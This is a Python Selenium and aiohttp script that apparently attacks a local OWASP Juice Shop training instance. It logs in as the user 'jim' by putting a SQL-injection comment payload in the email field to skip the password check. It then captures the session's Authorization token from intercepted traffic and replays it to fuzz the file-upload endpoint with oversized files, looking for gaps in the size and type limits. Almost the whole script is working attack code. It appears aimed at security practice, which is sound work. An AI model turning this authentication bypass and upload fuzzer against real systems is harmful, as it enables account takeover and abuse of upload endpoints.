from selenium import webdriver
from selenium.webdriver.common.by import By
from seleniumwire import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.support import expected_conditions as EC
import requests
import time
import aiohttp
import asyncio
import aiohttp
import asyncio
import os

# jim@juice-sh.op'--
# 1234
EMAIL = "jim@juice-sh.op'--"
PASSWORD = "1234"
ENTRY_ENDPOINT = 'http://localhost:3000/#/'
FILE_COMPLAINT_ENDPOINT = 'http://localhost:3000/file-upload'

data = ""
headers = ""

exposed_endpoints_arr = []

driver = webdriver.Chrome()
# driver.install()
options = webdriver.ChromeOptions()

def simulate_user(max_size):

    driver.get(ENTRY_ENDPOINT)

    banner_button = WebDriverWait(driver, 3).until(
        EC.presence_of_element_located((By.XPATH, '//*[@id="mat-dialog-0"]/app-welcome-banner/div/div[2]/button[2]'))
    )
    banner_button.click()

    account = driver.find_element(By.XPATH, '/html/body/app-root/div/mat-sidenav-container/mat-sidenav-content/app-navbar/mat-toolbar/mat-toolbar-row/button[3]/span[1]/span')
    account.click()

    login = WebDriverWait(driver, 100).until(
        EC.presence_of_element_located((By.ID, "navbarLoginButton"))
    )
    login.click()

    email_input = driver.find_element(By.XPATH, '/html/body/app-root/div/mat-sidenav-container/mat-sidenav-content/app-login/div/mat-card/div/mat-form-field[1]/div/div[1]/div[3]/input')
    email_input.send_keys(EMAIL)

    password_input = driver.find_element(By.XPATH, '/html/body/app-root/div/mat-sidenav-container/mat-sidenav-content/app-login/div/mat-card/div/mat-form-field[2]/div/div[1]/div[3]/input')
    password_input.send_keys(PASSWORD)

    try_login = driver.find_element(By.XPATH, '/html/body/app-root/div/mat-sidenav-container/mat-sidenav-content/app-login/div/mat-card/div/button[1]/span[1]')
    try_login.click()

    side_panel = WebDriverWait(driver, 100).until(
        EC.presence_of_element_located((By.XPATH, '/html/body/app-root/div/mat-sidenav-container/mat-sidenav-content/app-navbar/mat-toolbar/mat-toolbar-row/button[1]/span[1]/mat-icon'))
    )
    side_panel.click()

    complaint = driver.find_element(By.XPATH, '/html/body/app-root/div/mat-sidenav-container/mat-sidenav/div/sidenav/mat-nav-list/a[2]')
    complaint.click()

    message = driver.find_element(By.XPATH, '/html/body/app-root/div/mat-sidenav-container/mat-sidenav-content/app-complaint/div/mat-card/div[2]/mat-form-field[2]/div/div[1]/div[3]/textarea')
    message.send_keys('message')
    fuzz_client_side(max_size)


def fuzz_client_side(max_size):

    directory = os.fsencode("./client_files_test")

        # loop through all words in file that we'll try and find endpoints with
    file_upload = driver.find_element(By.XPATH, '/html/body/app-root/div/mat-sidenav-container/mat-sidenav-content/app-complaint/div/mat-card/div[2]/div/input')
    
    for file in os.listdir(directory):

        file_name = os.fsdecode(file)
        file_size = os.path.getsize(f'./client_files_test/{file_name}')
        size_kb = file_size/(1024)  # convert bytes to KB

        if size_kb > max_size:
            file = f'/client_files_test/{file_name}'
            file_upload.send_keys(os.getcwd() + file)
            
            display_message = driver.find_element(By.XPATH, '/html/body/app-root/div/mat-sidenav-container/mat-sidenav-content/app-complaint/div/mat-card/div[2]').text

            if (display_message != "Forbidden file type. Only PDF, ZIP allowed." and
                display_message != "File too large. Maximum 100 KB allowed."):
                print("success")

    print("no exploits found on client side\n")

def find_request(max_size):

    file = '/valid_file.pdf' 
    file_upload = driver.find_element(By.ID, 'file')
    file_upload.send_keys(os.getcwd() + file)
    submit = driver.find_element(By.ID, 'submitButton')
    submit.click()

    time.sleep(4)   # give time for the api request to show up
    auth = ""

    for request in driver.requests:
        # if request.response:
        if (request.url == FILE_COMPLAINT_ENDPOINT):
            auth = request.headers['Authorization']
            # print(request.headers['Authorization'])

    driver.close()
    asyncio.run(run_file_fuzzer(auth, max_size))
    
async def run_file_fuzzer(auth, max_size):

    url = "http://localhost:3000/file-upload"
    headers = {
        "Authorization": auth,
    }
    directory = os.fsencode("./client_files_test")

    async with aiohttp.ClientSession() as session:
        for file in os.listdir(directory):

            file_name = os.fsdecode(file)
            f = open(f'./client_files_test/{file_name}', 'rb')
            file_size = os.path.getsize(f'./client_files_test/{file_name}')
            size_kb = file_size/(1024)
            
            if size_kb > max_size:
                try:
                    response = await session.post(url=url, data={"file": f.read()}, headers=headers, timeout=5)
                    await response.text()
                    if (response.status == 204):
                        file_extension = os.path.splitext(f'./client_files_test/{file_name}')[1]
                        print(f'file {file_name} accepted, file type: {file_extension}, file size {round(size_kb, 3)}')
                        
                except:
                    print("API request failed with file: " + file_name)

def main():
    max_size = float(input("What is the maximum file size (KB)? "))
    print("Runnning file upload fuzz tester on client side\n")
    simulate_user(max_size)
    print("Runnning file upload fuzz tester on backend endpoint\n")
    find_request(max_size)

    # asyncio.run(run_fuzzer(TEST_ENDPOINT))

if __name__ == "__main__":
    main()
